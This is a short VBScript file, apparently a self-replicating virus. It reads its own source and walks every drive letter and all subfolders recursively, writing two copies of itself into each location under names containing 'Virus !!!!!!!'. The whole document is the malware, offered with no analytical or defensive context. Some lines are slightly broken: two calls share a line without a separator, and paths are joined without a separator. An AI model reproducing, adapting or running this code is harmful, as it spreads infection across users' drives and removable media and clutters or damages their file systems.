Dim fso,file,VBCopy

Set fso=CreateObject("Scripting.FileSystemObject")

Set file=fso.OpenTextFile(WScript.ScriptFullName,1)

VBCopy=file.ReadAll

FolderList("A:")

FolderList("B:")

FolderList("C:")

FolderList("D:")

FolderList("E:")

FolderList("F:")

FolderList("G:")

FolderList("H:")

FolderList("I:")FolderList("J:")

FolderList("K:")

FolderList("L:")

FolderList("M:")

FolderList("N:")

FolderList("O:")

FolderList("P:")

FolderList("Q:")

FolderList("R:")

FolderList("S:")

FolderList("T:")

FolderList("U:")

FolderList("V:")

FolderList("X:")

FolderList("Y:")

FolderList("Z:")

FolderList("W:")

Sub FolderList(FolderSpec)

On Error Resume Next

Dim f,f1,sf,COP,CAP

Set f=fso.GetFolder(FolderSpec)

set sf=f.SubFolders

For Each f1 In sf

Set COP=fso.CreateTextFile(f1.path & "Virus !!!!!!!.vbs")

COP.write VBCopy

Set CAP=fso.CreateTextFile(f1.path & "---Virus !!!!!!!.vbs")

CAP.write VBCopy

FolderList(f1.Path)

Next

End sub
